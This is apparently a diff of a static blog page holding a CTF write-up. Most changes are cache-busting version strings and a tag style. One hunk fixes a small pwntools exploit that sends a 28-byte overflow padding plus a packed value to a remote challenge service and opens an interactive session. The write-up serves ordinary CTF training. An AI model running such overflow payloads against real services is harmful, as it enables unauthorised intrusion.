@@ -7,7 +7,7 @@
 <title>
     Wectf1--WriteUp | We_ax
 </title>
-<link rel="shortcut icon" href="https://we-ax.github.io/favicon.ico?v=1570454645412">
+<link rel="shortcut icon" href="https://we-ax.github.io/favicon.ico?v=1570531083802">
 <!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"> -->
 <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
@@ -35,7 +35,7 @@
     <div class="nav">
         <div class="logo">
             <a href="https://we-ax.github.io">
-                <img class="avatar" src="https://we-ax.github.io/images/avatar.png?v=1570454645412" alt="">
+                <img class="avatar" src="https://we-ax.github.io/images/avatar.png?v=1570531083802" alt="">
             </a>
             <div class="site-title">
                 <h1>
@@ -112,7 +112,7 @@
                             <time class="post-time">2019-10-06</time>
                             
                                 <a href="https://we-ax.github.io/tag/4REPgFG5c" class="post-tag i-tag
-                            i-tag-other_2">
+                            i-tag-primary">
                             #writeup
                         </a>
                                 
@@ -1067,7 +1067,7 @@ port = 0000
 r = remote(host, port)
 exp = 'k' * 28 + p64(1)
 r.sendline(exp)
-r.interactive
+r.interactive()
 </code></pre>
 <h2 id="ncpwn签到">nc(pwn签到)</h2>
 <pre><code class="language-c">// filename:1.c
